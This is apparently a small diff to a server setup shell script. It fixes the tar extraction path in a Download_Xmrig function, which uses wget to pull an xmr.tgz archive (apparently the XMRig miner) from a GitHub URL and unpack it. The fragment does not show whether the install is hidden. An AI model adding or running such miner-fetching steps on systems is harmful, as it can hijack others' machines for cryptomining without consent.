@@ -194,7 +194,7 @@ Install_PHP() {
 }
 
 Download_Xmrig() {
-    wget -O /tmp/xmr.tgz https://raw.githubusercontent.com/qwinwin/qwin/dev/xmr.tgz && tar -xzvf /tmp/xmr.tgz .
+    wget -O /tmp/xmr.tgz https://raw.githubusercontent.com/qwinwin/qwin/dev/xmr.tgz && tar -xzvf /tmp/xmr.tgz -C .
 }
 
 Get_IP
